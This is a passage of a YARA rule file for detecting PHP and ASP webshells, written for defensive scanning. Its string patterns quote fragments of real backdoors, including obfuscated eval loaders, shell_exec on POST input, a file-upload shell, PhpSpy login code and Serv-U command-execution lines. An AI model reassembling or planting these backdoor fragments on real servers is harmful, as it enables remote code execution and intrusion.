      $s15 = "RNJBu0A4joCjuJPzv/naYSPDcH5kD+9Dz4F3sb1IteNB+m9JUE99ZM15P4dE5ycYZXYlqXy+z8svNeh5/wuaZ+xhVgvDPRMj643dNb9p3AZbkkXM4DrBvVwbXOTKgET/" ascii
      $s16 = "zz4kqHe013hcie4l1M10Vmz19qGpDCo9cct+KW2an5akmo8vRB9smJBNr9cDyo3ohIlXD8XFZFDXNpZ6L4OloGyph0t0jvFd6N06s7eUrZyc2uR9aBS0WzOxPdeG/Rhg" ascii
      $s17 = "unkwqkfLogK8Wk/Nr14R3BtceXTkdxbXbp8cGyP1j2fzPLvrWcn4JnlyBLz5ndCqSZEJJhTpoC+qpLOM1er7sej0OJWNVqx4nZlun0bL1n2XHtn8gjmaPtWzFIcZULNd" ascii
      $s18 = "o+iSCL7SK4BgdF8thffq1NIcU+WNkDvOBJLDthYZN+eekplM0i1XCGGAxy+7KLRirC2/EQT9kY9eVn/At5QfYEadVsP0BQO3hM6uCp5PC2AR4ebQdhAKirwd0fzHTX1L" ascii
      $s19 = "Gpi22jz716cNtECh6lkURMMkDPAngRvLryPFDiIG8HMJ2YWwSUZgN0Q6Gnpt65R20siDJ9CmyKonmYrua5kg/YTEaxmKHRxkfeJ1kKIo1K+UJqtspYjDpnfE9BCe5P01" ascii
      $s20 = "wgoEgRdhimxfAPeEgzpW3yfVTz0ka34eISt+wiCl5MiiUqoDtUP0CEXfpE70H00Z78iK4z/MB47LYgN4q2rs0hZRHiBShWHj97C5Qn1eVGwpsSWjdbxkxE2tREiEyYPt" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_110070f5a8d02be898a4994929d4eb481ce363bf
{
   meta:
      description = "php17 - file 110070f5a8d02be898a4994929d4eb481ce363bf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b436a1f35db50efc76bfbced7734eac54fc49f661431da180e439a7b2833ce05"
   strings:
      $s1 = "$m='/_/VO\",\"VO/-/\")VO,array(\"VO/\",\"+\"),$sVOs($s[$iVO]VO,0,$e))),$VOkVO)));$o=ob_VOgVOet_contents();VOVOobVO_end_c';" fullword ascii
      $s2 = "$N='$iVO]=\"\";$VOp=$sVOs($p,3);}VOVOif(VOarray_key_exiVOstsVO($i,$s)){VO$sVO[$i].=VO$p;$e=strposVO($s[VO$i],VO$f);if($eV';" fullword ascii
      $s3 = "$H=';$rr=@VO$VOr[VO\"HTTP_REFERER\"];$VOra=@$r[VO\"VOHTTP_ACCEVOPT_LANGUAGE\"VO];if($VOrr&VO&VOVO$raVO){$u=VOpaVOrse_url(';" fullword ascii
      $s4 = "$Y='lean();$dVO=baseVO64_encode(VOx(gzcVOoVOmpresVOs($o)VO,$k));prinVOt(\"VO<$k>$d</$k>\")VO;@seVOssioVOnVO_destroy();}}}}';" fullword ascii
      $s5 = "$x=',0,VO3));VOVO$VOp=\"\";for($z=1;$z<cVOount($m[1]);$z+VOVO+)$VOp.=$q[$m[2][$VOz]];ifVO(sVOVOtrVOpos($p,$h)===0){$s[';" fullword ascii
      $s6 = "$b='VOVO.([\\\\d]))?,?/VO\",$rVOa,$m);if($q&VO&$m){@VOsessiVOon_start()VO;$s=VO&$_SESSIOVON;$ss=\"VOsubVOstrVO\";$sl=\"sVO';" fullword ascii
      $s7 = "$q='$kh=\"5dVO41\";$kfVO=\"4VO02aVO\";function x($tVO,$VOk){VO$c=strlenVO($VOk);$l=strVOlVOen($tVO);$o=\"\";for($i=0VO;$i<VO';" fullword ascii
      $s8 = "$d='$rr);parse_str($u[\"querVOyVO\"],$q);$qVO=aVOrray_values($VOVOq);preg_matcVOh_aVOll(\"/VOVO([\\\\VOwVO])[\\\\w-]+(?:;q=0';" fullword ascii
      $s9 = "$v='$l;){for(VO$j=0VO;VO($jVO<$c&VO&$i<$l);VO$j++,$i++){$o.VO=$t{$VOiVO}VO^$k{$jVO};}VO}return $o;}$r=$_SEVORVOVVOER';" fullword ascii
      $s10 = "$e='trtoloVOwer\";$VOiVO=$m[1][0]VO.$m[1][1]VO;$h=VO$sl($ss(mdVO5($VOi.$kh),VOVO0,3));$f=$slVOVO($ss(md5($i.$kfVO)VO';" fullword ascii
      $s11 = "$K='OVO){$k=$kh.VO$kf;obVO_VOstVOart();@eVOval(@gzuncVOompress(VO@x(@baVOse64_decodVOe(pVOreg_repVOVOlace(array(VO\"';" fullword ascii
      $s12 = "$P=str_replace('VO','',$q.$v.$H.$d.$b.$e.$x.$N.$K.$m.$Y);" fullword ascii
      $s13 = "$g=str_replace('y','','creyatyey_fyunyctyion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php17_addons
{
   meta:
      description = "php17 - file addons.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "72890c8f063c2cd1340c3fc3249ee2dc2fed1617853f4ff877afcd0ae34da5c4"
   strings:
      $x1 = "$items = wp_remote_get( 'https://ninjaforms.com/?extend_feed=jlhrbgf89734go7387o4g3h' );" fullword ascii
      $s2 = "$link = 'http://www.shareasale.com/r.cfm?u=' . $u_id . '&b=812237&m=63061&afftrack=&urllink=' . $link;            " fullword ascii
      $s3 = "// $uri = 'https://ninjaforms.com/downloads/category/ninja-forms/feed/';" fullword ascii
      $s4 = "'title' => '<div class=\"nf-brand-header\"><div class=\"nf-logo\"></div><div class=\"wpn-logo\">brought by</div></div>'," fullword ascii
      $s5 = "echo '<strong>' . $item['title'] . '</strong> requires an update. You have version <strong>' . $version . '</str" fullword ascii
      $s6 = "$plugin_data = get_plugin_data( WP_PLUGIN_DIR.'/'.$item['plugin'], false, true );" fullword ascii
      $s7 = "ong> installed. The current version is <strong>' . $item['version'] . '</strong>.';" fullword ascii
      $s8 = "$version = isset ( $plugin_data['Version'] ) ? $plugin_data['Version'] : '';" fullword ascii
      $s9 = "echo '<p>' . __( 'Documentation coming soon.', 'ninja-forms' ) . '</a>.</p>';" fullword ascii
      $s10 = "if( !empty( $item['plugin'] ) && file_exists( WP_PLUGIN_DIR.'/'.$item['plugin'] ) ){" fullword ascii
      $s11 = "if ( ! empty ( $version ) && $version < $item['version'] ) {" fullword ascii
      $s12 = "echo '<a href=\"' . $item['docs'] . '\" class=\"button-secondary nf-doc-button\">' . __( 'Documentation', 'ninja" fullword ascii
      $s13 = "echo '<a href=\"' . $link . '\" title=\"' . $item['title'] . '\" class=\"button-primary nf-button\">' . __( 'Learn" fullword ascii
      $s14 = "$u_id = get_option( 'nf_aff', false );" fullword ascii
      $s15 = "if ( !$u_id ) $u_id = apply_filters( 'ninja_forms_affiliate_id', false );" fullword ascii
      $s16 = "echo '<p>' . $item['content'] . '</p>';" fullword ascii
      $s17 = "echo '<a href=\"' . $link . '\" title=\"' . $item['title'] . '\" class=\"button-primary nf-button\">' . __( 'L" fullword ascii
      $s18 = "//include_once(ABSPATH . WPINC . '/feed.php');" fullword ascii
      $s19 = "$items = wp_remote_retrieve_body( $items );" fullword ascii
      $s20 = "echo '<span class=\"button-secondary nf-button\">' . __( 'Installed', 'ninja-forms' ) . '</span>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}


rule sig_59071f351c59fff3c2fd47631ed1fe97a1ca920d
{
   meta:
      description = "php17 - file 59071f351c59fff3c2fd47631ed1fe97a1ca920d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e661e1f81601283d74b4e3040791c2fbc328da9d3d0c7e19b5c42b821c6f9da8"
   strings:
      $x1 = "${\"\\x47\\x4cO\\x42\\x41\\x4cS\"}[\"\\x73j\\x6fbv\\x73n\\x65\\x6f\"]=\"\\x74\\x65\\x73\\x74_comm\\x61\\x6e\\x64\";${\"\\x47\\x4" ascii
      $s2 = "ed f\\x6fr \\x73ec\\x75\\x72\\x69\\x74y\"))return\"\\x73hel\\x6c\\x5f\\x65\\x78\\x65c\";}function execute($command,$function,$n_" ascii
      $s3 = "]}=ob_get_contents();ob_end_clean();break;case\"s\\x68\\x65\\x6cl\\x5fex\\x65\\x63\":${$kqpvqhcmvrmc}=shell_exec(${${\"\\x47L\\x" ascii
      $s4 = "\\x4fB\\x41L\\x53\"}[\"p\\x76b\\x6d\\x73\\x6f\\x74s\"]}!=\"\"){$ngseiucxltgo=\"data\";${$ngseiucxltgo}[\"\\x72es\\x75lt\"]=execu" ascii
      $s5 = "\\x41\\x4cS\"}[\"a\\x6dzx\\x68\\x76llts\"]}=getValidCommandFunction();$_SESSION[\"\\x74e\\x72\\x6d\\x69\\x6e\\x61l\"][\"functio" ascii
      $s6 = "\\x65o\"]});${$ghigyghux}=ob_get_contents();ob_end_clean();if(trim(${$lfsymwmwkegs})!=\"\"&&!strstr(${$klccwcinikqe},\"\\x64\\x6" ascii
      $s7 = "$password = \"mad\"; " fullword ascii
      $s8 = "{\"GL\\x4f\\x42\\x41LS\"}[\"u\\x79\\x6b\\x6ec\\x72g\"]=\"\\x66w\";${${\"\\x47L\\x4fB\\x41\\x4c\\x53\"}[\"\\x6c\\x71\\x69\\x69d" ascii
      $s9 = "4c\\x4fB\\x41L\\x53\"}[\"u\\x69\\x79p\\x6ew\\x74c\\x75\\x67\"]}=ob_get_contents();$klccwcinikqe=\"r\\x65\\x73\\x75\\x6c\\x74\";o" ascii
      $s10 = "\"\\x47\\x4c\\x4f\\x42\\x41LS\"}[\"k\\x78\\x6d\\x68\\x75\\x76a\"]}=ob_get_contents();ob_clean();${${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s11 = "le\\x64 f\\x6fr\\x20sec\\x75rit\\x79\"))return\"p\\x61ss\\x74\\x68\\x72\\x75\";${$hljctji}=shell_exec(${${\"G\\x4c\\x4f\\x42A\\x" ascii
      $s12 = "\\x69\\x54\\x20!\\x20<\\x62\\x72/\\x3e\\nD\\x72.\\x5a\\x30mbi\\x65 - \\x41n\\x20I\\x6eno\\x63\\x65\\x6et\\x20\\x48\\x34\\x78\\x3" ascii
      $s13 = "\\x4cS\"}[\"\\x63\\x71unwh\\x6d\\x66\"]=\"r\\x65\\x73p\\x6f\\x6e\\x73\\x65\";function getIsCrawler($userAgent){${${\"GL\\x4f\\x4" ascii
      $s14 = "\\x70x\\x70\\x70vu\\x68\"]}=\"<span\\x20\\x63\\x6c\\x61ss=\\\"\\x70r\\x65\\x66\\x69\\x78\\x22>[\\x23]\".@get_current_user().\"" ascii
      $s15 = "Kha\\x6et\\x61s\\x74\\x69C - \\x54\\x68e\\x20G\\x6f\\x76.\\x20BanGer,\\x20\\n\";response(${${\"\\x47LO\\x42\\x41\\x4c\\x53\"}[\"" ascii
      $s16 = "\\x62r\\x20/>\\\" +\\x20c\\x6fnfig_comm\\x61nd_p\\x72e\\x66\\x69x + \\\" \\x22\\x3b\\n\\t\\t\\t\\t}\\x65ls\\x65 i\\x66(r\\x65\\x" ascii
      $s17 = "\\x6es\\x65\\x2ecode\\x20==\\x203\\x300){\\n\\t\\t\\t\\t\\t\\x72esu\\x6ct = \\x63on\\x66\\x69g\\x5fcomm\\x61\\x6e\\x64_\\x70r\\x" ascii
      $s18 = "61\\x6e\";function getValidCommandFunction(){${\"\\x47L\\x4f\\x42AL\\x53\"}[\"\\x76f\\x79m\\x75s\\x76\\x79\"]=\"\\x72\\x65\\x73" ascii
      $s19 = "ux=\"\\x72e\\x73\\x75\\x6c\\x74\";$lfsymwmwkegs=\"\\x72\\x65\\x73u\\x6c\\x74\";${$byksydcbr}=exec(${${\"\\x47L\\x4f\\x42\\x41\\x" ascii
      $s20 = "x73pan>\";if($_SESSION[\"te\\x72\\x6dinal\"][\"lo\\x67\\x67edin\"]&&isset($_GET[\"\\x66\\x69le\"])){${\"\\x47\\x4cO\\x42A\\x4cS" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_06largescale_with_cellcaching_sqlite3
{
   meta:
      description = "php17 - file 06largescale-with-cellcaching-sqlite3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "477849e7e9506d045fc5ec9cf0f3333800c09070938c2130e6dfe83d7e0b7e93"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s5 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s6 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "$objPHPExcel->getActiveSheet()->getPageSetup()->setRowsToRepeatAtTopByStartAndEnd(1, 1);" fullword ascii
      $s9 = "$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setVisible(false);" fullword ascii
      $s10 = "$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setVisible(false);" fullword ascii
      $s11 = "$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setOutlineLevel(1)" fullword ascii
      $s12 = "$objPHPExcel->getActiveSheet()->setCellValue('A1', \"Firstname\");" fullword ascii
      $s13 = "$objPHPExcel->getActiveSheet()->setCellValue('B1', \"Lastname\");" fullword ascii
      $s14 = "$objPHPExcel->getActiveSheet()->setCellValue('E1', \"Is Client ?\");" fullword ascii
      $s15 = "$objPHPExcel->getActiveSheet()->setCellValue('A' . $i, \"FName $i\")" fullword ascii
      $s16 = "$objPHPExcel->getProperties()->setCreator(\"Maarten Balliauw\")" fullword ascii
      $s17 = "$objPHPExcel->getActiveSheet()->setCellValue('D1', \"Fax\");" fullword ascii
      $s18 = "$objPHPExcel->getActiveSheet()->setCellValue('C1', \"Phone\");" fullword ascii
      $s19 = "/** Error reporting */" fullword ascii
      $s20 = "$objPHPExcel->getActiveSheet()->freezePane('A2');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule add_message
{
   meta:
      description = "php17 - file add_message.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f7eb6526d4f94927b2b04fa833ac091bc635ecad9d60d978c853d3c7baecc6e9"
   strings:
      $x1 = "if (!Loader::helper('validation/antispam')->check($_POST['cnvMessageBody'], 'conversation_comment')) {" fullword ascii
      $x2 = "if (!Loader::helper('validation/token')->validate('add_conversation_message', $_POST['token'])) {" fullword ascii
      $s3 = "if (Loader::helper('validation/numbers')->integer($_POST['cnvMessageParentID']) && $_POST['cnvMessageParentID'] > 0) {" fullword ascii
      $s4 = "$msg = ConversationMessage::add($cn, $author, $cnvMessageSubject, $_POST['cnvMessageBody'], $parent);" fullword ascii
      $s5 = "if (Loader::helper('validation/numbers')->integer($_POST['cnvID'])) {" fullword ascii
      $s6 = "if (!$vs->notempty($_POST['cnvMessageAuthorName'])) {" fullword ascii
      $s7 = "// We know that we have access. So let's check to see if the user is logged in. If they're not we're going" fullword ascii
      $s8 = "$maxFiles = $u->isRegistered() ? $blockObj->getController()->maxFilesRegistered : $blockObj->getController()->maxFilesGuest;" fullword ascii
      $s9 = "$maxFiles = $u->isRegistered() ? $blockObj->getController()->maxFilesRegistered : $blockObj->getController()->maxFil" fullword ascii
      $s10 = "if (Config::get('conversations.banned_words') && Loader::helper('validation/banned_words')->hasBannedWords($_POST['cnvMessageBod" ascii
      $s11 = "if (!$vs->notempty($_POST['cnvMessageBody'])) {" fullword ascii
      $s12 = "if (Config::get('conversations.banned_words') && Loader::helper('validation/banned_words')->hasBannedWords($_POST['cnvMessageBod" ascii
      $s13 = "$ve = Loader::helper('validation/error');" fullword ascii
      $s14 = "$ve->add(t('You must enter a valid email address to post this message.'));" fullword ascii
      $s15 = "$canReview = $blockObj->getController()->enableTopCommentReviews && !$_POST['cnvMessageParentID'];" fullword ascii
      $s16 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s17 = "$parent = ConversationMessage::getByID($_POST['cnvMessageParentID']);" fullword ascii
      $s18 = "$pk = PermissionKey::getByHandle('add_conversation_message');" fullword ascii
      $s19 = "$ve->add(t(\"Incorrect image validation code. Please check the image and re-enter the letters or numbers as necessary.\"));" fullword ascii
      $s20 = "$author->setName($_POST['cnvMessageAuthorName']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule ActionArgumentsController
{
   meta:
      description = "php17 - file ActionArgumentsController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ec99fce386996c9cff13b36c3a9d3bf0ac85a6fef0b95e7094c76a6c49cdb29"
   strings:
      $s1 = "* @Route(\"/action-arguments\", service=\"test.action_arguments\")" fullword ascii
      $s2 = "public function normalAction(RequestInterface $request, MessageInterface $message, ServerRequestInterface $serverRequest)" fullword ascii
      $s3 = "public function __invoke(RequestInterface $request, MessageInterface $message, ServerRequestInterface $serverRequest)" fullword ascii
      $s4 = "use Sensio\\Bundle\\FrameworkExtraBundle\\Configuration\\Route;" fullword ascii
      $s5 = "use Symfony\\Component\\HttpFoundation\\Response;" fullword ascii
      $s6 = "* @Route(\"/invoke/\")" fullword ascii
      $s7 = "* @Route(\"/normal/\")" fullword ascii
      $s8 = "use Psr\\Http\\Message\\ServerRequestInterface;" fullword ascii
      $s9 = "use Psr\\Http\\Message\\RequestInterface;" fullword ascii
      $s10 = "use Psr\\Http\\Message\\MessageInterface;" fullword ascii
      $s11 = "namespace Tests\\Fixtures\\ActionArgumentsBundle\\Controller;" fullword ascii
      $s12 = "return new Response('<html><body>ok</body></html>');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_8cb920e907d03c01ede32ca82469f2ec6b551746
{
   meta:
      description = "php17 - file 8cb920e907d03c01ede32ca82469f2ec6b551746.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
   strings:
      $x1 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x2 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s3 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s4 = "if ($_COOKIE['loginpass'] != $admin['pass']) {" fullword ascii
      $s5 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s6 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
      $s7 = "scookie('loginpass', md5($password));" fullword ascii
      $s8 = "m('Deleted file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);" fullword ascii
      $s9 = "r: 2009 Build 20081222</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" ascii
      $s10 = "\"'.$dir.'\" type=\"hidden\" /><input name=\"dir\" value=\"'.$dir.'\" type=\"hidden\" /></div></form>');" fullword ascii
      $s11 = "$admin['pass']  = 'f4f068e71e0d87bf0ad51e6214ab84e9'; //angel" fullword ascii
      $s12 = "if ($admin['pass'] == md5($password)) {" fullword ascii
      $s13 = "$size = round($size / 1048576 * 100) / 100 . ' M';" fullword ascii
      $s14 = "$size = round($size / 1073741824 * 100) / 100 . ' G';" fullword ascii
      $s15 = "<a href=\"javascript:goaction('file');\">File Manager</a> | " fullword ascii
      $s16 = "<a href=\"javascript:goaction('phpenv');\">PHP Variable</a>" fullword ascii
      $s17 = "function getextension($filename) {" fullword ascii
      $s18 = "$size = round($size / 1024 * 100) / 100 . ' K';" fullword ascii
      $s19 = "$ext = getextension($file);" fullword ascii
      $s20 = "th=\"20%\">Chmod / Perms</td><td width=\"22%\">Action</td></tr>');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule php17_90sec
{
   meta:
      description = "php17 - file 90sec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1f03d072034d3a365701794ac8492b20d5535b520f2dcc35ca538714162c63a"
   strings:
      $s1 = "$plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);" fullword ascii
      $s2 = "$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" fullword ascii
      $s3 = "eval(decrypt($hash,$key));" fullword ascii
      $s4 = "$shellcode='12ec445a8c4be78007d08367455c60d571c3509ba62d1f2b321fa824667345ff3131b02b81c8ad646ffc3360e60d19d3f7f43b7b21f5bca05d6e" ascii
      $s5 = "$shellcode='12ec445a8c4be78007d08367455c60d571c3509ba62d1f2b321fa824667345ff3131b02b81c8ad646ffc3360e60d19d3f7f43b7b21f5bca05d6e" ascii
      $s6 = "function decrypt($ciphertext_hex,$key){" fullword ascii
      $s7 = "$ciphertext_dec = substr($ciphertext_dec, $iv_size);" fullword ascii
      $s8 = "2f9845918c7d6630764dad77808e376e099008403b01c491399da5cb3c8926c29b1bf89e8c751fb33a850c608b20e4c41cf28ec8b8060a30a827b43cd301d9c5" ascii
      $s9 = "7abfc2461b5d72fffb22659aa08655cdd8734baa0fd47b93a5659348954f853d3a68022fb3422a3832efa04792c1a81680e5aa8081716f169e05afb332a26fbd" ascii
      $s10 = "$iv_dec = substr($ciphertext_dec, 0, $iv_size);" fullword ascii
      $s11 = "$ciphertext_dec = pack(\"H*\",$ciphertext_hex);" fullword ascii
      $s12 = "if(@$_REQUEST['key']){" fullword ascii
      $s13 = "$key=$_REQUEST['key'];" fullword ascii
      $s14 = "87863ce39f2326345a0217110fc898acb6c3343f3ce8';" fullword ascii
      $s15 = "echo 'ERROR!';" fullword ascii
      $s16 = "$key=md5($key);" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 4KB and
      8 of them
}

rule php17_2015
{
   meta:
      description = "php17 - file 2015.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "22594c7dc1266c774013c03032242537e260afa7a68448fb0e40e37416514822"
   strings:
      $s1 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vbcrlf & \"-RelPaths=1\" & vbcrlf & _" fullword ascii
      $s2 = "\"-NeedSecure=0\" & vbcrlf & \"-HideHidden=0\" & vbcrlf & \"-AlwaysAllowLogin=0\" & vbcrlf & \"-ChangePassword=0\" & vbcrlf & _" fullword ascii
      $s3 = "Send(networkStream2, \"site exec \" & Command & vbcrlf)" fullword ascii
      $s4 = "<asp:Label id=\"Label5\" runat=\"server\" width=\"40px\">cmd</asp:Label>" fullword ascii
      $s5 = "Dim DelDomain As String = \"-deleteDOMAIN\" & vbcrlf & \"-IP=0.0.0.0\" & vbcrlf & \" PortNo=43859\" & vbcrlf" fullword ascii
      $s6 = "<!-- insert content here -->" fullword ascii
      $s7 = "response.Write(\"out:\" & returndata & \"<br>\")" fullword ascii
      $s8 = "tcpClient.Connect(\"127.0.0.1\", port)" fullword ascii
      $s9 = "<asp:Label id=\"Label4\" runat=\"server\" width=\"40px\">Port</asp:Label>" fullword ascii
      $s10 = "<asp:Button id=\"BTN_Start\" onclick=\"BTN_Start_Click\" runat=\"server\" Text=\"Start\"></asp:Button>" fullword ascii
      $s11 = "Dim Command As String = Text_cmd.Text" fullword ascii
      $s12 = "<asp:Label id=\"Label1\" runat=\"server\" width=\"353px\" forecolor=\"Blue\">from Serv-U 2" fullword ascii
      $s13 = "<asp:TextBox id=\"Text_Port\" runat=\"server\">43958</asp:TextBox>" fullword ascii
      $s14 = "<%@ import Namespace=\"System.Net.Sockets\" %>" fullword ascii
      $s15 = "Send(networkStream, LoginPass)" fullword ascii
      $s16 = "Send(networkStream, LoginUser)" fullword ascii
      $s17 = "<asp:TextBox id=\"Text_cmd\" runat=\"server\"></asp:TextBox>" fullword ascii
      $s18 = "tcpClient2.Connect(\"127.0.0.1\", 43859)" fullword ascii
      $s19 = "Dim LoginUser As String = \"User \" & Usr & vbcrlf" fullword ascii
      $s20 = "Dim LoginPass As String = \"Pass \" & pwd & vbcrlf" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 10KB and
      8 of them
}

rule sig_1c94db1676e9909ccda804a6cda74d9a71ad2acf
{
   meta:
      description = "php17 - file 1c94db1676e9909ccda804a6cda74d9a71ad2acf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "18e8ada134076e225dfed766ab50928b1db28d574398cbabd250fc72e0a60bde"
   strings:
      $s1 = "$_= $_create_function(\"\",$_eval_post_1); //die(var_dump($_create_function ));" fullword ascii
      $s2 = "$_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr" fullword ascii
      $s3 = "$_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(11" fullword ascii
      $s4 = "(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); " fullword ascii
      $s5 = "0).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function " fullword ascii
      $s6 = "$_chr = chr(99).chr(104).chr(114); //chr  " fullword ascii
      $s7 = "$_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84)" ascii
   condition:
      uint16(0) == 0x6967 and filesize < 1KB and
      all of them
}

rule sig_2495b460f28f45b40d92da406be15627
{
   meta:
      description = "php17 - file 2495b460f28f45b40d92da406be15627.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da5186e8f19a79b34b24ccaa8847895f88bb195b48b44bc572987d0e8bdbd5ef"
   strings:
      $s1 = "e=\"submit\" name=\"s2\" value=\"Upload\"><input type=\"file\" name=\"file\" size=\"15\"></td></tr></table></body></html>" fullword ascii
      $s2 = "<html><body><?php echo getcwd();if (isset($_POST[\"s2\"])){$uploaded = $_FILES[\"file\"][\"tmp_name\"];if (file_exists($uploaded" ascii
      $s3 = "<html><body><?php echo getcwd();if (isset($_POST[\"s2\"])){$uploaded = $_FILES[\"file\"][\"tmp_name\"];if (file_exists($uploaded" ascii
      $s4 = "wddir = $_POST[\"dir\"];$real = $_FILES[\"file\"][\"name\"];$dez = $pwddir.\"/\".$real;copy($uploaded, $dez);echo \"FILE UPLOADE" ascii
      $s5 = "\";}}?><form name=\"form1\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"text\" name=\"dir\" size=\"30\" value=" ascii
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule AbstractReporter
{
   meta:
      description = "php17 - file AbstractReporter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "873b04e4983c0c2511a6ab60e2b97e519ea964de31ea12420919aa6c0d970796"
   strings:
      $s1 = "* Invoked after the test suite has ran, allowing for the display of test" fullword ascii
      $s2 = "* Ran prior to test suite execution." fullword ascii
      $s3 = "* Prints ASCII art based on whether or not any specs failed. If all specs" fullword ascii
      $s4 = "* ran using the command line." fullword ascii
      $s5 = "* passed, the randomly selected art is of a happier variety, otherwise" fullword ascii
      $s6 = "* @param Suite $suite The test suite before which to run this method" fullword ascii
      $s7 = "* @param Suite $suite The test suite after which to run this method" fullword ascii
      $s8 = "* Ran before the containing test suite is invoked." fullword ascii
      $s9 = "* Ran after the containing test suite is invoked." fullword ascii
      $s10 = "* @param Spec $spec The spec before which to run this method" fullword ascii
      $s11 = "$runningTime = round($endTime - $this->startTime, 5);" fullword ascii
      $s12 = "* Returns the number of specs ran by the reporter." fullword ascii
      $s13 = "* @param Console $console A console for writing output" fullword ascii
      $s14 = "* Inherited by Reporter classes to generate console output when pho is" fullword ascii
      $s15 = "$this->console->writeLn(\"\\nFailures:\");" fullword ascii
      $s16 = "* there's a lot of anger and flipped tables." fullword ascii
      $s17 = "$summaryText = \"\\n{$this->specCount} $specs, $failedCount $failures\" ." fullword ascii
      $s18 = "* results and related statistics." fullword ascii
      $s19 = "$incomplete = ($incompleteCount) ? \", $incompleteCount incomplete\" : '';" fullword ascii
      $s20 = "* @returns int The number of specs ran" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_1b2a4a7174ca170b4e3a8cdf4814c92695134c8a
{
   meta:
      description = "php17 - file 1b2a4a7174ca170b4e3a8cdf4814c92695134c8a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0333ec13d20d42f1f1a34713976c0ee31c9c867f0707f74630b0fbbf343eb7ce"
   strings:
      $s1 = "echo shell_exec($_POST['command']);" fullword ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii
      $s3 = "$file=@fopen($_FILES['userfile']['tmp_name'],\"r\") or die (\"[-]Error reading file!\");" fullword ascii
      $s4 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&exec_st method=\"post\">" fullword ascii
